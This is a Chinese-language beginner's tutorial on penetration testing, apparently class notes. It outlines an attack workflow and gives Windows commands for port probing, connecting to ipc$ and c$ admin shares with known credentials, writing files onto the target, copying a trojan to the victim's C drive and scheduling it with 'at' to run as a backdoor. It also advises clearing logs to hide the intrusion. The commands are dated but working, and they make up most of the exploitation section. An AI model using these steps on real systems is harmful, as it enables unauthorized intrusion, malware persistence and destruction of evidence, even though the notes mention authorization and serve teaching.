# 简单渗透测试的流程

[TOC]

## 一、流程

1. 授权
是指人为的授权，不是电脑授权。就是我允许你对我的电脑进行渗透，那你才是合法的，or you are illegal.

2. 信息收集
   * nslookup: =收集域名的 IP
   * whois: （网站）收集这个域名的子域名，是哪个公司的，邮箱是什么，电话号码是什么。如果是局域网就收集其他。

3. 扫描漏洞
    * nmap=ip 范围 端口 80(IIS, apache, 什么网站)
    * 高级扫描：
      如 IIS 漏洞2003-IIS6.0 2008-IIS7.0
      扫描网站漏洞

4. 漏洞利用

5. 提权（shell 环境、桌面环境）
6. 毁尸灭迹，清除自己的登录信息，清楚日志什么的
7. 留后门
8. 渗透报告

## 二、445 漏洞利用

1. 首先，怎么知道对方有没有开某个端口呢？使用以下命令可以知道：

    ```cmd
    telnet 10.1.1.1 445
    telnet 10.1.1.1 3389
    ```

    * 说明：`telnet` 命令是用来远程连接的，但是也经常用来做测试。给对方发一个探测包，看看有没有开对应端口。如果没有开，就会显示 `不能打开到主机的连接`。软件的检测也是利用这个原理。

2. 445 漏洞利用之 `ipc$`

    * 先学一条命令：该命令作用是把共享文件夹映射到本地盘符，这样每次访问就不用输入 `\\10.1.1.1\share` 的地址。（只对本次开机有效，长久有效设置：右键我的电脑 --> 映射网络驱动器）

    ```shell
    # 1. 把 share 文件夹映射到笨的 f 盘，打开我的电脑就可以看到这个盘符，点击就可以进去
    net use f: \\10.1.1.1\share 密码 /user:用户
    # 2. 取消上面的命令创建的盘符
    net use f: /del
    net use * /del # 删除所有链接
    # 3. 拓展
    net use f: \\10.1.1.1\c$ 密码 /user:用户
    net use \\10.1.1.1\ipc$ 密码 /user:用户 # 注意此命令不建立任何的映射盘符
    ```

    * 如何利用 `ipc$`

    ```shell
    # 1. 先建立空连接的映射
    net use \\10.1.1.1\ipc$ 密码 /user:用户
    # 2. 使用
    dir \\10.1.1.1\c$
    echo you are hacked! > \\10.1.1.1\d$\hello.txt
    ```

3. 视频教的是暴力破解，就是知道对方的账号密码之后用上面的命令进行对对方电脑的控制。

    * 说明：
    假设在已经得知对方的账号密码的情况下，通过 `net use` 命令控制对方，如果选择 `c$` 控制的是 c 盘，同理其他盘。而如果映射的是 `ipc$` 空连接，控制的是整个电脑。

## 三、后门

* 木马和病毒的区别：
  * 木马本身对电脑是没害的，有害的是控制木马的人。比如说：你电脑被种木马了，过一段时间电脑变卡了，那是因为控制木马的人对你电脑进行操作了。
  * 病毒是对计算机破坏的。
* 留后门就是种木马。

流程：（在和被控端建立了 `ipc$` 空连接的情况下）

1. 制作木马
2. 植入木马，把本地 d 盘的木马拷贝到被控端的 c 盘 `copy d:\heihei.exe \\10.1.1.1\c$\heihei.exe`
3. 查看被控端的时间 `net time \\10.1.1.1`
4. 为被控端添加计划任务，在11点11分执行 c 盘的木马程序（注意不要漏了 IP ，不然的话就是在本地执行了）`at \\10.1.1.1 11:11 "c:\heihei.exe"`
5. 等待肉鸡上线

* 注意：**替对方运行的时候千万不能用这样的命令** ：`\\10.1.1.1\c$\heihei.exe` 。
  这样是把对方的软件下载到本地运行！！
  